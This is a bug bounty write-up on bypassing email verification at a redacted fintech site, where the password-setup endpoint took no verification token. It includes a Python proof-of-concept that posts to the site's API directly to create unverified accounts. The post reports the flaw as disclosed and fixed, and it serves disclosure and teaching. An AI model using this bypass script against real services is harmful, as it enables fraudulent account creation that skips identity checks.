---
title: Bypassing a non existing email verification flow
date: 2022-05-15 16:00:00 +05:30
modified: 2022-05-15 16:00:00 +05:30
tags:
image: /carbon.png 
description: A blog post about how I bypassed a non existing email verification flow in a website.
---

Today I will be sharing my recent finding of an email verification bypass which allowed me to bypass “a non-existing e-mail verification flow”. I hope this will be a good read for you!

In April 2021, I was searching for a new bug bounty program, I usually do that by using google dorks, and similarly, I found one more this time. Let’s say the company is redacted.com to protect privacy.

Let’s learn more about redaced.com before learning about my finding. It is a fintech company which allows users to create accounts to access money across the globe. These accounts require verification, including verifying users' email addresses

Let’s Start “Hacking”!

<p>I started by creating an account on the target and using the website for some time to get a rough overview of the target. And after that, I selected to try bypassing the email verification process.</p>
<h2 id="this-is-how-the-targets-verification-process-worked">This is how the target’s verification process worked:</h2>
<ol>
<li>You visit <a href="http://redacted.com/signup">redacted.com/signup</a> and enter your email address</li>
<li>You receive an email with a verification URL</li>
<li>You click and open the URL and then you are redirected to the password setup page</li>
<li>You create a new password and provide other details and hit save</li>
<li>Your email gets verified and the account gets created</li>
</ol>
<p><strong>The verification URL looked like this:</strong><br>
<a href="https://www.redacted.com/app1/signup/verify?key=16641558218877162399&amp;email=example2%2540example.com">https://www.redacted.com/app1/signup/verify?key=16641558218877162399&amp;email=example2%40example.com</a></p>
<p>After looking at the URL, I thought of using some common bypasses like changing the email address in the URL or using random keys. And guess what? None of them worked!</p>
<h2 id="what’s-next-let’s-see-what’s-happening-at-the-backend.">What’s next? Let’s see what’s happening at the backend.</h2>
<p>The below two requests were made for the account creation and verification flow:</p>

- When signing-up:
<img src="https://raw.githubusercontent.com/SiddharthBharadwaj/siddharthbharadwaj.github.io/master/_posts/carbon.png" alt="">

- When setting up password after visiting the verification link:
<img src="https://raw.githubusercontent.com/SiddharthBharadwaj/siddharthbharadwaj.github.io/master/_posts/carbon1.png" alt="">

<p><strong>Observed anything odd in the second request ?</strong></p>
<p><strong>This is what I observed:</strong><br>
Even though the request was made after opening the verification link, there was no verification token in the request. This means that technically there is no email verification happening in the backend.</p>
<p><em>What if I make the second request with my email address directly after the first one without opening the verification URL?</em><br>
<strong>Yes, this worked!</strong> And I successfully created an account on <a href="http://redacted.com">redacted.com</a> without really verifying the email.</p>
<p>The next step was to report the vulnerability. So, I quickly wrote the below python exploit to make the reproduction part easy for the team and reported the vulnerability:</p>
<pre class=" language-python"><code class="prism  language-python"><span class="token keyword">import</span> requests

<span class="token keyword">class</span> <span class="token class-name">bcolors</span><span class="token punctuation">:</span>
    OKGREEN <span class="token operator">=</span> <span class="token string">'\033[92m'</span>
    ENDC <span class="token operator">=</span> <span class="token string">'\033[0m'</span>

url1 <span class="token operator">=</span> <span class="token string">"https://www.redacted.com/api/user"</span>
url2 <span class="token operator">=</span> <span class="token string">"https://www.redacted.com/api/user/account"</span>

headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'Host'</span><span class="token punctuation">:</span> <span class="token string">'www.redacted.com'</span><span class="token punctuation">,</span>
    <span class="token string">'Content-type'</span><span class="token punctuation">:</span> <span class="token string">'application/json'</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>

email <span class="token operator">=</span> <span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token string">"Enter email: "</span><span class="token punctuation">)</span>
phone <span class="token operator">=</span> <span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token string">"Enter phone number: "</span><span class="token punctuation">)</span>

data1 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"data"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"email"</span><span class="token punctuation">:</span>email<span class="token punctuation">,</span><span class="token string">"phoneNumber"</span><span class="token punctuation">:</span>phone<span class="token punctuation">}</span><span class="token punctuation">}</span>
data2 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"P@ssw0rd"</span><span class="token punctuation">,</span><span class="token string">"phoneNumber"</span><span class="token punctuation">:</span>phone<span class="token punctuation">,</span><span class="token string">"email"</span><span class="token punctuation">:</span>email<span class="token punctuation">}</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>bcolors<span class="token punctuation">.</span>OKGREEN <span class="token operator">+</span> <span class="token string">"Creating account with email: "</span> <span class="token operator">+</span> bcolors<span class="token punctuation">.</span>ENDC <span class="token operator">+</span>email<span class="token punctuation">)</span>
r1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url1<span class="token punctuation">,</span> headers <span class="token operator">=</span> headers<span class="token punctuation">,</span> json <span class="token operator">=</span> data1<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>bcolors<span class="token punctuation">.</span>OKGREEN <span class="token operator">+</span> <span class="token string">"Account Created!"</span> <span class="token operator">+</span> bcolors<span class="token punctuation">.</span>ENDC<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>bcolors<span class="token punctuation">.</span>OKGREEN <span class="token operator">+</span> <span class="token string">"Bypassing email verificaion &amp; setting password"</span> <span class="token operator">+</span> bcolors<span class="token punctuation">.</span>ENDC<span class="token punctuation">)</span>
r2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url2<span class="token punctuation">,</span> headers <span class="token operator">=</span> headers<span class="token punctuation">,</span> json <span class="token operator">=</span> data2<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>bcolors<span class="token punctuation">.</span>OKGREEN <span class="token operator">+</span> <span class="token string">"Completed!"</span> <span class="token operator">+</span> bcolors<span class="token punctuation">.</span>ENDC<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Account details:"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>bcolors<span class="token punctuation">.</span>OKGREEN <span class="token operator">+</span> <span class="token string">"Email: "</span> <span class="token operator">+</span> bcolors<span class="token punctuation">.</span>ENDC <span class="token operator">+</span>email<span class="token operator">+</span> bcolors<span class="token punctuation">.</span>OKGREEN <span class="token operator">+</span> <span class="token string">" Password: "</span><span class="token operator">+</span> bcolors<span class="token punctuation">.</span>ENDC <span class="token operator">+</span><span class="token string">"P@ssw0rd"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>

</code></pre>

After reporting, I got a response the next day confirming the existence of the vulnerability. And it was fixed on the second day and Bounty was awarded a day after that.

##### Takeaways
- Always use the application as a normal user before testing it for security misconfigurations
- Never skip basic bypasses/techniques as they might do the work
- Observe every request carefully
